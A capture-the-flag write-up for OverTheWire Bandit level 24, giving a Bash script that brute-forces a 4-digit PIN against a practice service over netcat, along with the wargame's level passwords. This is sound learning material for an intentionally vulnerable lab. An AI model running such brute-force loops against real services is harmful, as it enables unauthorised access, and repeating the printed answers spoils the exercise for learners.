# Bandit Level 24 ➔ Level 25

## 🧠 Goal:
The password for the next level is protected behind a service running on **localhost:30002**.  
You must:
1. Connect to the service using `netcat`.
2. Provide the password from the previous level.
3. Then brute-force a 4-digit PIN until you get the correct one.

---

## 🔐 Login:
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

## 🛠️ Commands Used:
```bash
#!/bin/bash
for pin in {0000..9999}; do
  echo "Trying PIN: $pin"
  response=$(echo -e "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002)
  echo "$response" | grep -q "Correct!" && echo "✔️ Success: $pin" && echo "$response" && break
done
chmod +x brute.sh
./brute.sh
```

## 🧾 Password Found:
`uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`

## 📘 What I Learned:
- How to write a simple brute-force loop in Bash.
-	How to interact with remote services via nc (netcat).
-	That sometimes password + PIN systems can be tested via automation.
